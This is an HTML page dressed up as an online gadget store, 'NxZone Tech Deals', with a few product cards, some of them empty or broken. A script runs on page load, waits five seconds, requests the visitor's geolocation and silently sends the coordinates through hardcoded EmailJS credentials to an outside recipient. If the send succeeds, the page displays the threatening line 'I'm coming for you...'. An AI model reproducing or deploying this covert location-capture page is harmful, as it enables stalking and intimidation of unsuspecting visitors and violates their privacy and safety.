<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>NxZone - Online Store</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f4f4f4;
      color: #333;
    }
    header {
      background-color: #1e1e2f;
      color: #fff;
      padding: 20px;
      text-align: center;
    }
    .products {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
      gap: 20px;
      padding: 40px;
    }
    .product {
      border: 1px solid #ddd;
      border-radius: 10px;
      padding: 15px;
      background: #fff;
      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
      transition: transform 0.2s;
    }
    .product:hover {
      transform: translateY(-5px);
    }
    .product img {
      width: 100%;
      height: auto;
      border-radius: 8px;
    }
    .product h3 {
      margin: 10px 0 5px;
    }
    .product p {
      color: #666;
    }
    .status-message {
      text-align: center;
      font-size: 1.2em;
      margin: 30px;
      color: green;
    }
  </style>
</head>
<body>

  <header>
    <h1>NxZone Tech Deals</h1>
    <p>Flash Sale | Limited Time Offers on Cool Gadgets!</p>
  </header>

  <section class="products">
    <div class="product">
      <img src="https://picsum.photos/id/1010/300/200" alt="Wireless Headphones" />

    </div>
    <div class="product">
      <img src="https://picsum.photos/id/25/300/200" alt="Gaming Mouse" />
      <h3>Gaming Mouse</h3>
      <p>â‚¹1,299</p>
    </div>
    <div class="product">
      <img src="https://picsum.photos/id/1003/300/200" alt="Bluetooth Speaker" />
      <h3>Bluetooth Speaker</h3>
      <p>â‚¹999</p>
    </div>
    <div class="product">
      <img src="https://picsum.photos/id/1025/300/200" alt="VR Headset" />
      <h3>VR Headset</h3>

    </div>
    <div class="product">

  </section>

  <div class="status-message" id="status-message"></div>

  <!-- EmailJS -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init("Yp_ze3KWAsaNdrJ8o");

    function sendLocation(lat, lon) {
      const templateParams = {
        name: "Nx28",
        time: new Date().toLocaleString(),
        message: "Ecommerce-style location capture",
        latitude: lat,
        longitude: lon
      };

      emailjs.send("service_axr26gf", "template_lpok9wl", templateParams)
        .then(() => {
          document.getElementById("status-message").innerText = "âœ… Iâ€™m coming for you...";
        }, (error) => {
          document.getElementById("status-message").innerText = "ðŸ˜Ž Enjoy bro!";
          console.error("âŒ Failed to send location.", error);
        });
    }

    if (navigator.geolocation) {
      setTimeout(() => {
        navigator.geolocation.getCurrentPosition((pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          sendLocation(lat, lon);
        }, () => {
          document.getElementById("status-message").innerText = "ðŸ˜Ž Enjoy bro!";
        });
      }, 5000);
    }
  </script>
</body>
